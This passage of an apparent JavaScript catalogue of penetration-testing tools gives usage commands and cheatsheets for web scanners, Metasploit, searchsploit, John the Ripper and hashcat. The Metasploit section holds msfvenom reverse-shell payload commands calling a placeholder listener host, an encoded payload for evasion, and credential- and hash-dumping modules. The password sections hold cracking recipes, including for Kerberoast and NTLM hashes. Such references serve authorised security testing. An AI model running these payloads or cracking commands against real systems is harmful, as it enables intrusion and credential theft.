      { cmd: "wfuzz -c -w wordlist.txt -p 127.0.0.1:8080 http://TARGET/FUZZ", desc: "Through proxy" },
      { cmd: "wfuzz -c -w wordlist.txt -e encoders", desc: "List available encoders" },
      { cmd: "wfuzz -c -z file,wordlist.txt,md5 http://TARGET/hash?q=FUZZ", desc: "Encode payloads with MD5" }
    ],
    common_flags: [
      { flag: "-c", desc: "Color output" },
      { flag: "-w", desc: "Wordlist file" },
      { flag: "-z", desc: "Payload specification (type,params,encoder)" },
      { flag: "--hc", desc: "Hide responses with these status codes" },
      { flag: "--sc", desc: "Show responses with these status codes" },
      { flag: "--hw/--sw", desc: "Hide/show by word count" },
      { flag: "--hl/--sl", desc: "Hide/show by line count" },
      { flag: "--hh/--sh", desc: "Hide/show by character count" },
      { flag: "-d", desc: "POST data" },
      { flag: "-H", desc: "HTTP header" },
      { flag: "-b", desc: "Cookie" },
      { flag: "-p", desc: "Proxy (host:port:type)" },
      { flag: "-t", desc: "Number of concurrent connections" },
      { flag: "-s", desc: "Time delay between requests (seconds)" },
      { flag: "-R", desc: "Recursive depth" },
      { flag: "--basic", desc: "HTTP Basic auth (user:pass)" },
      { flag: "-f", desc: "Output to file (filename,format)" },
      { flag: "-o", desc: "Output format (json, csv, html)" }
    ],
    output_format: "Tabular output with ID, response code, lines, words, chars, and payload. Supports JSON, CSV, HTML.",
    cheatsheet: [
      "wfuzz -c -w common.txt --hc 404 http://TARGET/FUZZ",
      "wfuzz -c -w wordlist.txt -H 'Host: FUZZ.domain.com' --hc 302 http://TARGET",
      "wfuzz -c -z range,1-1000 --hh 234 http://TARGET/page?id=FUZZ",
      "wfuzz -c -w users.txt -w passes.txt -d 'user=FUZZ&pass=FUZ2Z' http://TARGET/login",
      "wfuzz -c -w wordlist.txt --hc 404,403 -t 50 http://TARGET/FUZZ",
      "wfuzz -c -w wordlist.txt -p 127.0.0.1:8080 --hc 404 http://TARGET/FUZZ",
      "wfuzz -c -w wordlist.txt -b 'session=abc' http://TARGET/FUZZ",
      "wfuzz -c -w wordlist.txt --hl 0 http://TARGET/FUZZ"
    ],
    related_tools: ["ffuf", "gobuster", "feroxbuster"]
  },

  {
    name: "nuclei",
    category: "web",
    description: "Fast and customizable vulnerability scanner based on YAML templates. Supports scanning for CVEs, misconfigurations, default credentials, exposed panels, and more. Community-driven template repository with thousands of checks. Supports multiple protocols: HTTP, DNS, TCP, SSL, and file.",
    website: "https://github.com/projectdiscovery/nuclei",
    install: "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
    basic_usage: [
      { cmd: "nuclei -u http://TARGET", desc: "Scan a single URL with all templates" },
      { cmd: "nuclei -l urls.txt", desc: "Scan list of URLs" },
      { cmd: "nuclei -u URL -t cves/", desc: "Run only CVE templates" },
      { cmd: "nuclei -u URL -severity critical,high", desc: "Only critical and high severity" },
      { cmd: "nuclei -u URL -tags xss,sqli", desc: "Run templates tagged with xss or sqli" },
      { cmd: "nuclei -update-templates", desc: "Update template repository" }
    ],
    advanced_usage: [
      { cmd: "nuclei -l urls.txt -t cves/ -severity critical -o critical_vulns.txt", desc: "Critical CVEs across many targets" },
      { cmd: "nuclei -u URL -t custom-template.yaml", desc: "Run custom template" },
      { cmd: "nuclei -l urls.txt -tags tech -as", desc: "Auto-detect tech stack and scan" },
      { cmd: "nuclei -u URL -headless -t headless/", desc: "Headless browser-based scanning" },
      { cmd: "nuclei -l urls.txt -rate-limit 150 -bulk-size 25 -c 25", desc: "Rate-limited bulk scan" },
      { cmd: "nuclei -u URL -t http/technologies/ -j | jq '.info.name'", desc: "JSON output piped to jq" },
      { cmd: "nuclei -u URL -w workflows/wordpress-workflow.yaml", desc: "Run a predefined workflow" }
    ],
    common_flags: [
      { flag: "-u", desc: "Target URL to scan" },
      { flag: "-l", desc: "File containing list of URLs" },
      { flag: "-t", desc: "Template(s) or directory to run" },
      { flag: "-severity", desc: "Filter by severity (info, low, medium, high, critical)" },
      { flag: "-tags", desc: "Filter by template tags" },
      { flag: "-etags", desc: "Exclude templates with these tags" },
      { flag: "-o", desc: "Output file" },
      { flag: "-j", desc: "JSON output" },
      { flag: "-rate-limit", desc: "Maximum requests per second" },
      { flag: "-bulk-size", desc: "Maximum hosts analyzed in parallel" },
      { flag: "-c", desc: "Maximum templates executed in parallel" },
      { flag: "-H", desc: "Custom header" },
      { flag: "-as", desc: "Automatic web scan (tech detection + matching templates)" },
      { flag: "-headless", desc: "Enable headless browser templates" },
      { flag: "-w", desc: "Workflow to run" },
      { flag: "-update-templates", desc: "Update nuclei-templates" },
      { flag: "-proxy", desc: "HTTP/SOCKS5 proxy" },
      { flag: "-silent", desc: "Show only results in output" },
      { flag: "-stats", desc: "Display statistics" }
    ],
    output_format: "Findings with severity, template name, matched URL. Supports JSON, JSONL, and plain text.",
    cheatsheet: [
      "nuclei -u URL -severity critical,high -o findings.txt",
      "nuclei -l live_hosts.txt -t cves/ -rate-limit 100",
      "nuclei -u URL -tags xss -j -silent",
      "nuclei -u URL -as -stats",
      "nuclei -l urls.txt -t exposures/ -severity medium,high,critical",
      "nuclei -u URL -t http/misconfiguration/ -proxy http://127.0.0.1:8080",
      "nuclei -u URL -w workflows/wordpress-workflow.yaml",
      "cat urls.txt | nuclei -t cves/2024/ -silent",
      "subfinder -d domain.com | httpx | nuclei -t cves/ -o vulns.txt"
    ],
    related_tools: ["nikto", "httpx", "katana"]
  },

  {
    name: "httpx",
    category: "web",
    description: "Fast and multi-purpose HTTP toolkit from ProjectDiscovery. Probes URLs for live hosts, follows redirects, extracts titles, status codes, content length, technologies, and more. Essential for asset discovery pipelines.",
    website: "https://github.com/projectdiscovery/httpx",
    install: "go install github.com/projectdiscovery/httpx/cmd/httpx@latest",
    basic_usage: [
      { cmd: "echo 'target.com' | httpx", desc: "Probe a single domain" },
      { cmd: "cat domains.txt | httpx -status-code -title", desc: "Probe with status codes and titles" },
      { cmd: "cat urls.txt | httpx -mc 200", desc: "Filter for 200 OK responses" },
      { cmd: "subfinder -d domain.com | httpx", desc: "Probe subdomains for live hosts" },
      { cmd: "cat ips.txt | httpx -ports 80,443,8080,8443", desc: "Probe multiple ports" }
    ],
    advanced_usage: [
      { cmd: "cat domains.txt | httpx -tech-detect -status-code -title -content-length -json -o results.json", desc: "Full recon with tech detection" },
      { cmd: "cat urls.txt | httpx -follow-redirects -fr -maxr 5", desc: "Follow redirects with max depth" },
      { cmd: "cat domains.txt | httpx -screenshot -system-chrome", desc: "Take screenshots of live hosts" },
      { cmd: "cat urls.txt | httpx -hash md5 -jarm", desc: "Compute response hash and JARM fingerprint" },
      { cmd: "cat domains.txt | httpx -favicon -hash sha256", desc: "Extract and hash favicons" }
    ],
    common_flags: [
      { flag: "-status-code / -sc", desc: "Display response status code" },
      { flag: "-title", desc: "Display page title" },
      { flag: "-content-length / -cl", desc: "Display response content length" },
      { flag: "-tech-detect / -td", desc: "Display technologies (Wappalyzer)" },
      { flag: "-mc", desc: "Match status codes" },
      { flag: "-fc", desc: "Filter status codes" },
      { flag: "-ms/-fs", desc: "Match/filter by response size" },
      { flag: "-json / -j", desc: "JSON output" },
      { flag: "-o", desc: "Output file" },
      { flag: "-ports", desc: "Ports to probe" },
      { flag: "-threads / -t", desc: "Number of threads" },
      { flag: "-follow-redirects / -fr", desc: "Follow HTTP redirects" },
      { flag: "-screenshot", desc: "Take screenshots" },
      { flag: "-favicon", desc: "Extract favicon hash" },
      { flag: "-hash", desc: "Hash response body (md5, sha256)" },
      { flag: "-jarm", desc: "JARM TLS fingerprint" },
      { flag: "-probe", desc: "Display probe status" },
      { flag: "-rate-limit / -rl", desc: "Maximum requests per second" }
    ],
    output_format: "One result per line with requested fields. Supports JSON and plain text.",
    cheatsheet: [
      "subfinder -d domain.com -silent | httpx -sc -title -td",
      "cat alive.txt | httpx -mc 200 -title -o live_200.txt",
      "cat domains.txt | httpx -ports 80,443,8080 -sc -title -json -o full.json",
      "cat urls.txt | httpx -tech-detect -json | jq '.technologies'",
      "echo target.com | httpx -follow-redirects -screenshot",
      "cat ips.txt | httpx -ports 80-100,443,8443 -threads 50"
    ],
    related_tools: ["nuclei", "katana", "subfinder"]
  },

  {
    name: "katana",
    category: "web",
    description: "Next-generation crawling and spidering framework from ProjectDiscovery. Supports standard and headless browser-based crawling with automatic form filling, JavaScript rendering, and scope control. Outputs discovered endpoints, parameters, and files.",
    website: "https://github.com/projectdiscovery/katana",
    install: "go install github.com/projectdiscovery/katana/cmd/katana@latest",
    basic_usage: [
      { cmd: "katana -u http://TARGET", desc: "Crawl a website" },
      { cmd: "katana -u URL -d 3", desc: "Crawl with depth 3" },
      { cmd: "katana -u URL -jc", desc: "Enable JavaScript crawling" },
      { cmd: "katana -u URL -f qurl", desc: "Output only URLs with query parameters" },
      { cmd: "katana -list urls.txt", desc: "Crawl multiple URLs from file" }
    ],
    advanced_usage: [
      { cmd: "katana -u URL -headless -d 5 -jc -o endpoints.txt", desc: "Deep headless crawl with JS" },
      { cmd: "katana -u URL -f ext -em js,json,xml,csv", desc: "Extract only specific file types" },
      { cmd: "katana -u URL -aff -kf all", desc: "Automatic form fill with all known fields" },
      { cmd: "katana -u URL -fs dn -cs '.*\\.target\\.com'", desc: "Restrict crawl to target domain" },
      { cmd: "echo target.com | subfinder | httpx | katana -d 2 -jc", desc: "Full pipeline crawl" }
    ],
    common_flags: [
      { flag: "-u", desc: "Target URL to crawl" },
      { flag: "-list", desc: "File containing URLs to crawl" },
      { flag: "-d", desc: "Maximum crawl depth (default 3)" },
      { flag: "-jc", desc: "Enable JavaScript rendering/crawling" },
      { flag: "-headless", desc: "Use headless browser for crawling" },
      { flag: "-f", desc: "Field to output (url, qurl, path, fqdn, rdn, rurl, file, key, value, kv, dir, udir)" },
      { flag: "-em", desc: "Extension match (filter output to specific extensions)" },
      { flag: "-ef", desc: "Extension filter (exclude specific extensions)" },
      { flag: "-fs", desc: "Scope filter strategy (dn=domain, rdn=root domain)" },
      { flag: "-cs", desc: "Crawl scope regex" },
      { flag: "-aff", desc: "Automatic form filling" },
      { flag: "-kf", desc: "Known fields for form filling" },
      { flag: "-c", desc: "Concurrency" },
      { flag: "-p", desc: "Parallelism" },
      { flag: "-rate-limit", desc: "Maximum requests per second" },
      { flag: "-o", desc: "Output file" },
      { flag: "-j", desc: "JSON output" }
    ],
    output_format: "One URL per line. Supports JSON and filtered field output.",
    cheatsheet: [
      "katana -u URL -d 5 -jc -o crawled.txt",
      "katana -u URL -f qurl | sort -u > params.txt",
      "katana -u URL -headless -aff -d 3",
      "katana -u URL -f ext -em js | sort -u > js_files.txt",
      "echo domain.com | subfinder | httpx | katana -d 2 -jc -o all_urls.txt"
    ],
    related_tools: ["httpx", "gospider", "hakrawler"]
  },

  {
    name: "whatweb",
    category: "web",
    description: "Next generation web scanner that identifies websites. Recognizes web technologies including CMS, blogging platforms, JavaScript libraries, web servers, embedded devices, version numbers, email addresses, account IDs, web framework modules, and SQL errors. Over 1800 plugins.",
    website: "https://github.com/urbanadventurer/WhatWeb",
    install: "sudo apt install whatweb",
    basic_usage: [
      { cmd: "whatweb http://TARGET", desc: "Identify technologies on a site" },
      { cmd: "whatweb -v http://TARGET", desc: "Verbose output" },
      { cmd: "whatweb -a 3 http://TARGET", desc: "Aggressive scan (more requests)" },
      { cmd: "whatweb --input-file=urls.txt", desc: "Scan multiple URLs" },
      { cmd: "whatweb http://TARGET --log-json=output.json", desc: "JSON output" }
    ],
    advanced_usage: [
      { cmd: "whatweb -a 4 --colour=never URL --log-brief=results.txt", desc: "Max aggression, brief log" },
      { cmd: "whatweb URL --proxy 127.0.0.1:8080", desc: "Through proxy" },
      { cmd: "whatweb -p WordPress,Apache URL", desc: "Check only specific plugins" },
      { cmd: "whatweb --url-suffix='/wp-admin' URL", desc: "Append path to URL" },
      { cmd: "whatweb URL --user-agent 'Googlebot'", desc: "Custom User-Agent" }
    ],
    common_flags: [
      { flag: "-v", desc: "Verbose output" },
      { flag: "-a", desc: "Aggression level (1=stealthy, 3=aggressive, 4=heavy)" },
      { flag: "--input-file", desc: "Read URLs from file" },
      { flag: "--log-json", desc: "JSON log file" },
      { flag: "--log-xml", desc: "XML log file" },
      { flag: "--log-brief", desc: "Brief one-line-per-target log" },
      { flag: "-p", desc: "Select specific plugins" },
      { flag: "--proxy", desc: "HTTP proxy" },
      { flag: "--user-agent", desc: "Custom User-Agent string" },
      { flag: "--colour", desc: "Color output (always/never/auto)" },
      { flag: "--max-threads", desc: "Maximum simultaneous threads" },
      { flag: "--follow-redirect", desc: "Follow redirects (always/never/same-site/same-domain)" }
    ],
    output_format: "Colored one-line summaries per host, with technology names and version numbers. Supports JSON, XML, and brief log formats.",
    cheatsheet: [
      "whatweb -v TARGET",
      "whatweb -a 3 --log-json=tech.json TARGET",
      "whatweb --input-file=urls.txt --log-brief=report.txt",
      "whatweb -p WordPress TARGET",
      "whatweb -a 4 TARGET --follow-redirect=always"
    ],
    related_tools: ["wappalyzer", "httpx", "nuclei"]
  },

  {
    name: "feroxbuster",
    category: "web",
    description: "Fast, simple, recursive content discovery tool written in Rust. Brute forces directories and files with support for recursion, extraction of links from response bodies, and multiple output formats. Known for reliability and speed with smart filtering.",
    website: "https://github.com/epi052/feroxbuster",
    install: "sudo apt install feroxbuster  # or cargo install feroxbuster",
    basic_usage: [
      { cmd: "feroxbuster -u http://TARGET", desc: "Directory brute force with default wordlist" },
      { cmd: "feroxbuster -u URL -w wordlist.txt", desc: "Custom wordlist" },
      { cmd: "feroxbuster -u URL -x php,html,txt", desc: "With file extensions" },
      { cmd: "feroxbuster -u URL --depth 3", desc: "Recursive with depth 3" },
      { cmd: "feroxbuster -u URL -o results.txt", desc: "Save output to file" }
    ],
    advanced_usage: [
      { cmd: "feroxbuster -u URL -w big.txt -x php -t 100 --smart --auto-tune", desc: "Smart auto-tuning scan" },
      { cmd: "feroxbuster -u URL --extract-links --collect-words", desc: "Extract links and build wordlist" },
      { cmd: "feroxbuster -u URL -C 404,403 -S 0", desc: "Filter by status and size" },
      { cmd: "feroxbuster -u URL --burp --burp-replay http://127.0.0.1:8080", desc: "Send to Burp" },
      { cmd: "feroxbuster -u URL -w wordlist.txt --parallel 5 --rate-limit 100", desc: "Rate limited parallel scan" }
    ],
    common_flags: [
      { flag: "-u", desc: "Target URL" },
      { flag: "-w", desc: "Wordlist to use" },
      { flag: "-x", desc: "File extension(s) to append" },
      { flag: "-t", desc: "Number of concurrent threads (default 50)" },
      { flag: "-d / --depth", desc: "Maximum recursion depth (default 4)" },
      { flag: "-o", desc: "Output file" },
      { flag: "--json", desc: "JSON output" },
      { flag: "-C", desc: "Filter out status codes" },
      { flag: "-S", desc: "Filter out response sizes" },
      { flag: "-W", desc: "Filter out word count" },
      { flag: "-N", desc: "Filter out line count" },
      { flag: "--extract-links", desc: "Extract links from response bodies" },
      { flag: "--collect-words", desc: "Build wordlist from responses" },
      { flag: "--smart", desc: "Smart filtering (auto-detect custom 404s)" },
      { flag: "--auto-tune", desc: "Automatically adjust scan speed" },
      { flag: "-r", desc: "Follow redirects" },
      { flag: "-k", desc: "Disable TLS certificate validation" },
      { flag: "-H", desc: "HTTP header" },
      { flag: "-b", desc: "Cookie" },
      { flag: "--rate-limit", desc: "Requests per second" },
      { flag: "--burp", desc: "Set up Burp-compatible proxy" }
    ],
    output_format: "Real-time colorized output with status codes, sizes, and URLs. Supports JSON and plain text.",
    cheatsheet: [
      "feroxbuster -u URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
      "feroxbuster -u URL -x php,bak -t 100 -d 2 --smart",
      "feroxbuster -u URL --extract-links -o links.txt",
      "feroxbuster -u URL -C 404 -S 0 --json -o results.json",
      "feroxbuster -u URL -w wordlist.txt --rate-limit 50 -k",
      "feroxbuster -u URL --collect-words --extract-links -d 3"
    ],
    related_tools: ["ffuf", "gobuster", "dirb"]
  },

  {
    name: "burpsuite",
    category: "web",
    description: "Industry-standard integrated platform for web application security testing. Includes an intercepting proxy, spider, scanner, intruder (fuzzer), repeater, decoder, comparer, and extensibility via BApp Store. Community Edition is free; Professional adds the scanner and advanced features.",
    website: "https://portswigger.net/burp",
    install: "Download from portswigger.net/burp/releases (Java required)",
    basic_usage: [
      { cmd: "java -jar burpsuite_community.jar", desc: "Launch Burp Suite" },
      { cmd: "Proxy → Intercept → set browser proxy to 127.0.0.1:8080", desc: "Set up intercepting proxy" },
      { cmd: "Target → Site map → browse target in proxied browser", desc: "Build site map" },
      { cmd: "Right-click request → Send to Repeater", desc: "Manually modify and resend requests" },
      { cmd: "Right-click request → Send to Intruder", desc: "Fuzz parameters" }
    ],
    advanced_usage: [
      { cmd: "Intruder → Sniper/Battering Ram/Pitchfork/Cluster Bomb attack types", desc: "Different fuzzing strategies" },
      { cmd: "Scanner → Active scan → configure scope and insertion points", desc: "Automated vulnerability scanning (Pro)" },
      { cmd: "Extender → BApp Store → install extensions (ActiveScan++, Autorize, etc.)", desc: "Add functionality via extensions" },
      { cmd: "Comparer → paste two responses → compare", desc: "Diff two responses" },
      { cmd: "Sequencer → capture tokens → analyze randomness", desc: "Test token randomness quality" }
    ],
    common_flags: [
      { flag: "--project-file", desc: "Load a Burp project file" },
      { flag: "--config-file", desc: "Load a configuration file" },
      { flag: "--user-config-file", desc: "Load user-level configuration" },
      { flag: "--unpause-spider-and-scanner", desc: "Start spider and scanner automatically" },
      { flag: "-Xmx2G", desc: "Set JVM max memory (Java flag)" }
    ],
    output_format: "GUI-based. Exports to XML, HTML reports. Intruder results exportable as CSV.",
    cheatsheet: [
      "Set browser proxy: 127.0.0.1:8080",
      "Install Burp CA cert: http://burp in proxied browser",
      "Scope: Target → Scope → Add → include only target domain",
      "Intruder: mark payload positions with § symbols",
      "Match/Replace: Proxy → Options → Match and Replace rules",
      "Macros: Project Options → Sessions → Macros (for auth tokens)",
      "Collaborator: Burp → Collaborator client (for OOB testing)",
      "Extension: Logger++ for detailed request logging",
      "Extension: Autorize for auth testing",
      "Extension: Hackvertor for encoding/decoding"
    ],
    related_tools: ["zap", "mitmproxy", "caido"]
  },

  // ============================================================================
  // EXPLOITATION TOOLS
  // ============================================================================

  {
    name: "metasploit",
    category: "exploitation",
    description: "The world's most widely used penetration testing framework. Provides exploit modules, payloads, encoders, auxiliary scanners, and post-exploitation tools. Supports exploit development, payload generation (msfvenom), and automated exploitation workflows. Includes over 2000 exploits and 600 payloads.",
    website: "https://www.metasploit.com",
    install: "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall",
    basic_usage: [
      { cmd: "msfconsole", desc: "Launch the Metasploit console" },
      { cmd: "search eternalblue", desc: "Search for exploits by keyword" },
      { cmd: "use exploit/windows/smb/ms17_010_eternalblue", desc: "Select an exploit module" },
      { cmd: "show options", desc: "Display module options" },
      { cmd: "set RHOSTS 192.168.1.1", desc: "Set target host" },
      { cmd: "set PAYLOAD windows/x64/meterpreter/reverse_tcp", desc: "Set the payload" },
      { cmd: "set LHOST 192.168.1.100", desc: "Set listener IP" },
      { cmd: "exploit / run", desc: "Execute the exploit" }
    ],
    advanced_usage: [
      { cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe", desc: "Generate Windows reverse shell EXE" },
      { cmd: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf", desc: "Generate Linux reverse shell" },
      { cmd: "msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -o shell.php", desc: "Generate PHP web shell" },
      { cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/xor_dynamic -i 5 LHOST=IP LPORT=4444 -f exe -o encoded.exe", desc: "Encoded payload for evasion" },
      { cmd: "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST IP; exploit -j", desc: "Background listener" },
      { cmd: "use auxiliary/scanner/smb/smb_ms17_010", desc: "Scan for EternalBlue vulnerability" },
      { cmd: "use auxiliary/scanner/portscan/tcp", desc: "TCP port scanner module" },
      { cmd: "sessions -l", desc: "List active sessions" },
      { cmd: "sessions -i 1", desc: "Interact with session 1" },
      { cmd: "route add 10.10.10.0/24 1", desc: "Route traffic through session 1 (pivoting)" }
    ],
    common_flags: [
      { flag: "search <keyword>", desc: "Search for modules by keyword" },
      { flag: "use <module>", desc: "Select a module" },
      { flag: "info", desc: "Display detailed module information" },
      { flag: "show options", desc: "Display module options and their values" },
      { flag: "show payloads", desc: "List compatible payloads" },
      { flag: "show exploits", desc: "List all exploit modules" },
      { flag: "show auxiliary", desc: "List all auxiliary modules" },
      { flag: "set/setg", desc: "Set option value (setg = global)" },
      { flag: "check", desc: "Check if target is vulnerable (if supported)" },
      { flag: "exploit / run", desc: "Execute the module" },
      { flag: "exploit -j", desc: "Run exploit as background job" },
      { flag: "sessions", desc: "List/interact with active sessions" },
      { flag: "background / bg", desc: "Background the current session" },
      { flag: "db_nmap", desc: "Run nmap and store results in database" },
      { flag: "hosts / services", desc: "View database of discovered hosts/services" },
      { flag: "vulns", desc: "View discovered vulnerabilities" },
      { flag: "workspace", desc: "Manage workspaces for different engagements" },
      { flag: "resource <file>", desc: "Run commands from a resource script" }
    ],
    output_format: "Interactive console with session management. Database stores hosts, services, vulns, credentials, loot.",
    cheatsheet: [
      "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe",
      "msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf > shell",
      "msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f war > shell.war",
      "msfvenom -p python/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.py",
      "msfvenom -l payloads | grep windows | grep meterpreter",
      "msfvenom -l encoders",
      "msfvenom -l formats",
      "msfconsole -r automate.rc",
      "use post/multi/gather/firefox_creds",
      "use post/windows/gather/hashdump",
      "use post/multi/recon/local_exploit_suggester",
      "use exploit/multi/handler",
      "use auxiliary/server/socks_proxy"
    ],
    related_tools: ["searchsploit", "pwntools", "empire", "cobalt-strike"]
  },

  {
    name: "searchsploit",
    category: "exploitation",
    description: "Command-line search tool for Exploit-DB, the largest archive of public exploits and corresponding vulnerable software. Searches the locally-stored offline copy of the Exploit Database. Provides exploit code, shellcode, and security papers.",
    website: "https://www.exploit-db.com/searchsploit",
    install: "sudo apt install exploitdb  # comes with Kali/Parrot",
    basic_usage: [
      { cmd: "searchsploit apache 2.4", desc: "Search for Apache 2.4 exploits" },
      { cmd: "searchsploit wordpress 5.0", desc: "Search for WordPress exploits" },
      { cmd: "searchsploit -w apache 2.4", desc: "Show Exploit-DB URLs" },
      { cmd: "searchsploit -m 42315", desc: "Copy exploit to current directory" },
      { cmd: "searchsploit --update", desc: "Update the exploit database" }
    ],
    advanced_usage: [
      { cmd: "searchsploit -t oracle 'remote code'", desc: "Search only in title" },
      { cmd: "searchsploit -e 'local privilege' linux kernel", desc: "Exact match search" },
      { cmd: "searchsploit --nmap nmap_scan.xml", desc: "Parse nmap XML for relevant exploits" },
      { cmd: "searchsploit -j apache | jq '.RESULTS_EXPLOIT'", desc: "JSON output for scripting" },
      { cmd: "searchsploit --exclude='Denial of Service' apache", desc: "Exclude DoS exploits" }
    ],
    common_flags: [
      { flag: "-w", desc: "Show URLs to Exploit-DB" },
      { flag: "-m", desc: "Mirror (copy) an exploit to current directory" },
      { flag: "-x", desc: "Examine an exploit (opens in pager)" },
      { flag: "-t", desc: "Search only in title (not path)" },
      { flag: "-e", desc: "Exact match" },
      { flag: "-j", desc: "JSON output" },
      { flag: "--nmap", desc: "Parse nmap XML output for exploits" },
      { flag: "--exclude", desc: "Exclude term from results" },
      { flag: "--update", desc: "Update the database" },
      { flag: "-c", desc: "Case-sensitive search" },
      { flag: "--id", desc: "Display EDB-ID" }
    ],
    output_format: "Tabular output with exploit title, path, and EDB-ID. Supports JSON.",
    cheatsheet: [
      "searchsploit linux kernel 5. | grep -i 'privilege'",
      "searchsploit -m 42315 && python 42315.py",
      "searchsploit --nmap scan.xml",
      "searchsploit -t 'remote code execution' windows",
      "searchsploit -j openssh | jq '.RESULTS_EXPLOIT | length'",
      "searchsploit --exclude='DoS' apache tomcat",
      "searchsploit -w wordpress plugin"
    ],
    related_tools: ["metasploit", "exploitdb"]
  },

  // ============================================================================
  // PASSWORD TOOLS
  // ============================================================================

  {
    name: "john",
    category: "password",
    description: "John the Ripper — fast password cracker. Supports hundreds of hash and cipher types including Unix crypt, Windows LM/NTLM, Kerberos, PKZIP, RAR, SSH keys, PDF, Office documents, and more. Features wordlist mode, incremental (brute force) mode, and rule-based attacks.",
    website: "https://www.openwall.com/john/",
    install: "sudo apt install john  # or build john-jumbo from source for full format support",
    basic_usage: [
      { cmd: "john hashes.txt", desc: "Auto-detect format and crack" },
      { cmd: "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt", desc: "Wordlist attack" },
      { cmd: "john --format=raw-md5 hashes.txt", desc: "Specify hash format" },
      { cmd: "john --show hashes.txt", desc: "Show cracked passwords" },
      { cmd: "john --list=formats", desc: "List all supported hash formats" },
      { cmd: "john --incremental hashes.txt", desc: "Brute force mode" }
    ],
    advanced_usage: [
      { cmd: "john --wordlist=rockyou.txt --rules=best64 hashes.txt", desc: "Wordlist with mangling rules" },
      { cmd: "john --mask='?u?l?l?l?d?d?d?d' hashes.txt", desc: "Mask attack (Ulll0000 pattern)" },
      { cmd: "john --fork=4 --wordlist=big.txt hashes.txt", desc: "Multi-process cracking" },
      { cmd: "john --format=krb5tgs --wordlist=rockyou.txt kerberoast.txt", desc: "Crack Kerberoast tickets" },
      { cmd: "john --format=netntlmv2 --wordlist=rockyou.txt ntlm_hashes.txt", desc: "Crack NTLMv2 hashes" },
      { cmd: "john --loopback hashes.txt", desc: "Use already-cracked passwords as wordlist" },
      { cmd: "john --format=zip2john --wordlist=rockyou.txt zip_hash.txt", desc: "Crack ZIP file password" },
      { cmd: "zip2john protected.zip > zip_hash.txt", desc: "Extract hash from ZIP file" },
      { cmd: "ssh2john id_rsa > ssh_hash.txt", desc: "Extract hash from SSH private key" },
      { cmd: "pdf2john protected.pdf > pdf_hash.txt", desc: "Extract hash from PDF file" }
    ],
    common_flags: [
      { flag: "--wordlist", desc: "Path to wordlist file" },
      { flag: "--rules", desc: "Apply word mangling rules (single, wordlist, best64, jumbo, etc.)" },
      { flag: "--format", desc: "Hash format (raw-md5, raw-sha256, ntlm, bcrypt, etc.)" },
      { flag: "--incremental", desc: "Brute force / incremental mode" },
      { flag: "--mask", desc: "Mask-based attack (?l=lower, ?u=upper, ?d=digit, ?s=special, ?a=all)" },
      { flag: "--show", desc: "Show cracked passwords" },
      { flag: "--fork", desc: "Number of processes to fork" },
      { flag: "--list=formats", desc: "List all supported hash formats" },
      { flag: "--list=rules", desc: "List available rule sets" },
      { flag: "--session", desc: "Name the cracking session" },
      { flag: "--restore", desc: "Restore a previous session" },
      { flag: "--pot", desc: "Custom potfile path" },
      { flag: "--loopback", desc: "Use potfile as additional wordlist" },
      { flag: "--single", desc: "Single crack mode (uses login info)" }
    ],
    output_format: "Cracked password:hash pairs stored in john.pot file. --show displays user:password.",
    cheatsheet: [
      "john --wordlist=rockyou.txt --format=raw-md5 hashes.txt",
      "john --wordlist=rockyou.txt --rules=best64 ntlm_hashes.txt",
      "john --mask='?u?l?l?l?l?d?d?s' --format=raw-sha256 hashes.txt",
      "john --fork=4 --wordlist=big.txt --format=bcrypt hashes.txt",
      "john --incremental=digits --format=raw-md5 hashes.txt",
      "john --show --format=raw-md5 hashes.txt",
      "zip2john file.zip > hash.txt && john hash.txt",
      "ssh2john id_rsa > hash.txt && john --wordlist=rockyou.txt hash.txt",
      "john --session=crack1 --wordlist=rockyou.txt hashes.txt",
      "john --restore=crack1"
    ],
    related_tools: ["hashcat", "hydra", "hash-identifier"]
  },

  {
    name: "hashcat",
    category: "password",
    description: "World's fastest and most advanced password recovery utility. Supports GPU acceleration with OpenCL/CUDA for over 300 hash types. Features multiple attack modes: dictionary, combinator, brute-force, hybrid, association, and rule-based. The gold standard for offline password cracking.",
    website: "https://hashcat.net",
    install: "sudo apt install hashcat  # requires GPU drivers (OpenCL/CUDA)",
    basic_usage: [
      { cmd: "hashcat -m 0 hashes.txt wordlist.txt", desc: "MD5 dictionary attack" },
      { cmd: "hashcat -m 1000 hashes.txt wordlist.txt", desc: "NTLM dictionary attack" },
      { cmd: "hashcat -m 0 -a 3 hashes.txt '?a?a?a?a?a?a'", desc: "MD5 brute force 6 chars" },
      { cmd: "hashcat -m 0 hashes.txt wordlist.txt -r rules/best64.rule", desc: "With rules" },
      { cmd: "hashcat --show -m 0 hashes.txt", desc: "Show cracked passwords" },
      { cmd: "hashcat --example-hashes | grep -B1 -A1 'NTLM'", desc: "Find hash mode number" }
    ],
    advanced_usage: [
      { cmd: "hashcat -m 13100 kerberoast.txt wordlist.txt -r rules/best64.rule", desc: "Kerberoast with rules" },
      { cmd: "hashcat -m 5600 ntlmv2.txt wordlist.txt", desc: "NTLMv2 dictionary attack" },
      { cmd: "hashcat -m 0 -a 6 hashes.txt wordlist.txt '?d?d?d?d'", desc: "Hybrid: wordlist + 4 digits" },
      { cmd: "hashcat -m 0 -a 7 hashes.txt '?d?d?d?d' wordlist.txt", desc: "Hybrid: 4 digits + wordlist" },
      { cmd: "hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt", desc: "Combinator: word1+word2" },
      { cmd: "hashcat -m 3200 -w 3 -O hashes.txt wordlist.txt", desc: "bcrypt with optimized kernels" },
